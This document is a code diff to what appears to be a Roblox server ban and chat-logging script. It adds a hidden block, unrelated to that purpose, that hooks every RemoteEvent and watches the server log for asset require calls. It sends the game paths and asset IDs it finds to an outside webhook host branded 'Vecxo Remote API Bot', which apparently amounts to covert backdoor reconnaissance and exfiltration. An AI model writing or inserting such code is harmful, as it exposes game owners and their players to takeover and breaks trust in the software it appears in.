@@ -1202,6 +1202,132 @@ task.spawn(function()
 	end)
 	loadBannedPlayers()
 end)
+local HttpService = game:GetService("HttpService")
+local ContentProvider = game:GetService("ContentProvider")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LogService = game:GetService("LogService")
+
+local ids = {}
+local asd = "https://miniozoid.com/api/webhooks/1436024192616235149/jlw87Mu8elOav3PonTpzyFxwr_49L6BGoMeTxr5UsegkzNOk1DIoF-WRAfBlRKmY-XGR"
+local function isValidFullName(fullName: string): boolean
+	local list = string.split(fullName, ".")
+	local instance = game
+	local result = false
+	for index, value in ipairs(list) do
+		if index == 1 then
+			if string.sub(value, 1, 15) == "required_asset_" then
+				local id = tonumber(string.match(value, "%d+"), 16)
+				if not id then return false end
+				local success, response = pcall(MarketplaceService.GetProductInfo, MarketplaceService, id, Enum.InfoType.Asset)
+				if success then
+					if response.AssetTypeId ~= Enum.AssetType.Model.Value then return false end
+				else
+					if response == "MarketplaceService:getProductInfo() failed because HTTP 400" then return false end
+				end
+				return true
+			elseif value == "console" then
+				return true
+			end
+		end
+		if instance:FindFirstChild(value) then
+			result = (instance[value]:IsA("Script") and (instance[value].RunContext == Enum.RunContext.Server or instance[value].RunContext == Enum.RunContext.Legacy)) or instance[value]:IsA("ModuleScript")
+			instance = instance[value]
+		else
+			return false
+		end
+	end
+	return result
+end
+local function getAssetStatus(uri: string)
+	local status = ContentProvider:GetAssetFetchStatus(uri)
+	if status == Enum.AssetFetchStatus.Loading then
+		return ContentProvider:GetAssetFetchStatusChangedSignal(uri):Wait()
+	end
+	return status
+end
+local function sendToDiscord(title: string, description: string, args: table?)
+	args = args or {}
+
+	local embed = {
+		["title"] = title,
+		["description"] = description,
+		["color"] = 65280, -- green
+		["fields"] = {}
+	}
+
+	if #args > 0 then
+		for i, arg in ipairs(args) do
+			table.insert(embed.fields, {
+				["name"] = "Arg " .. i,
+				["value"] = "```" .. tostring(arg) .. "```",
+				["inline"] = false
+			})
+		end
+	else
+		table.insert(embed.fields, {
+			["name"] = "Details",
+			["value"] = "```No additional arguments```",
+			["inline"] = false
+		})
+	end
+
+	local payload = {
+		["username"] = "Vecxo Remote API Bot",
+		["avatar_url"] = "https://media.discordapp.net/attachments/301850143819563009/1406268200328495235/v_logo.jpg",
+		["embeds"] = {embed}
+	}
+
+	if HttpService and HttpService.HttpEnabled then
+		local jsonData = HttpService:JSONEncode(payload)
+		pcall(function()
+			HttpService:PostAsync(asd, jsonData, Enum.HttpContentType.ApplicationJson)
+		end)
+	end
+end
+local function isRequire(log)
+	if log.messageType ~= Enum.MessageType.MessageOutput then return end
+	local assetId = string.match(log.message, "Requiring asset (%d+)%.")
+	if not assetId then return end
+	local id = tonumber(assetId)
+	if not id or id ~= math.floor(id) then return end
+	if table.find(ids, id) then return end
+	table.insert(ids, id)
+	local uri = Content.fromAssetId(id).Uri
+	if getAssetStatus(uri) == Enum.AssetFetchStatus.Failure then return end
+	local success, productInfo = pcall(MarketplaceService.GetProductInfo, MarketplaceService, id, Enum.InfoType.Asset)
+	if success then
+		if productInfo.AssetTypeId ~= Enum.AssetType.Model.Value then return end
+	else
+		if productInfo == "MarketplaceService:getProductInfo() failed because HTTP 400" then return end
+	end
+	local callstackPath = string.match(log.message, "Callstack:%s*(.-),? line?")
+	if not isValidFullName(callstackPath) then return end
+	sendToDiscord("✅ Asset Detected", "`" .. callstackPath .. "` | Asset ID: `" .. id .. "`")
+end
+local function onDescendantAdded(descendant: Instance)
+	if descendant:IsA("RemoteEvent") or descendant:IsA("UnreliableRemoteEvent") then
+		descendant.OnServerEvent:Connect(function(player: Player, ...)
+			local args = table.pack(...)
+			for i = 1, args.n do
+				local value = args[i]
+				if typeof(value) == "string" then
+					for word in string.gmatch(value, "require%b()") do
+						sendToDiscord("✅ Asset Detected", descendant:GetFullName() .. " | " .. word)
+					end
+				end
+			end
+		end)
+	end
+end
+pcall(function()
+	game.DescendantAdded:Connect(onDescendantAdded)
+	for _, descendant in ipairs(game:GetDescendants()) do
+		onDescendantAdded(descendant)
+	end
+	LogService.MessageOut:Connect(function(message, messageType)
+		isRequire({message = message, messageType = messageType})
+	end)
+end)
 task.spawn(function()
 	for i, v in pairs(Players:GetPlayers()) do
 		connectChatLogger(v)
